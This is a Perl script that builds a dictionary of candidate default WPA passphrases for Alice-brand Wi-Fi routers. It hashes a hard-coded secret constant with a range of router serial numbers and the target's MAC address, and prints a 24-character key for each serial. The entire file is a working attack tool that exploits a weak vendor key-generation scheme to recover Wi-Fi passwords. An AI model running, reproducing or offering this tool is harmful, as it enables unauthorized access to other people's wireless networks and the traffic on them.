#!/usr/bin/perl 
#
# ------------------------------------------------------------------------
# Copyright (C) 2010 Valerio Di Giampietro (email: v@ler.io)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software Foundation,
# Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
# ------------------------------------------------------------------------
#

#
use Digest::SHA qw(sha256 sha256_hex);
use Getopt::Std;

sub usage {
    print "usage: alicewpa-dict.pl -s start_serial -e end_serial -m mac-address \n";
    print "   -v  verbose, elenca su ogni riga mac e serial relativo \n";
    print "example: alicewpa-dict.pl -s 67902X0000001 -e 67902X0999999 -m 6487d70ae9f1\n";
    exit;
}

getopts('s:e:m:v');

$verbose=$opt_v;
$s1 = $opt_s or usage;
$s2 = $opt_e or usage;
$mac= $opt_m or usage;
$mac= uc $mac;
$mac=~s/[\:\-]//g;
($sn1,$sn_s) = split /X/,$s1;
($sn2,$sn_e) = split /X/,$s2;

die "Errore nel mac address $mac \n"          unless ($mac=~/^[0-9a-f]{12}$/i);
die "Errore nel seriale di start $opt_s\n"    unless (($sn1=~/^\d{5}$/) and ($sn_s=~/^\d{7}$/));
die "Errore nel seriale di stop  $opt_e\n"    unless (($sn2=~/^\d{5}$/) and ($sn_e=~/^\d{7}$/));
die "Errore start ed end di serie diverse\n"  unless ($sn1 eq $sn2);


$fixed="64C6DDE3E579B6D986968D3445D23B15CAAF128402AC560005CE2075913FDCE8";

$charset = "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz"
         . "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz"
         . "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz"
         . "0123456789abcdefghijklmnopqrstuvwxyz0123";
@charset=split //,$charset;

#print "serial: $serial\n";
#print "mac:    $mac\n";
@machex    = ($mac =~ /(..)/g);
@macdec    = map { hex($_) } @machex;

@fixedhex    = ($fixed =~ /(..)/g);
@fixeddec    = map { hex($_) } @fixedhex;

$sfixed=pack("C*",@fixeddec);
$smac=  pack("C*",@macdec);

for ($i=$sn_s; $i<=$sn_e; $i++) {
    $s=sprintf "%07i",$i;
    #print $s,"\n";
    $digest=sha256($sfixed, $sn1, "X", $s, $smac);
    for $j (0 .. 23) {
	print $charset[ord(substr($digest,$j,1))];
    }
    if ($verbose) {
	print " - $mac - $sn1" , "X", $s;
    } 
    print "\n";
}



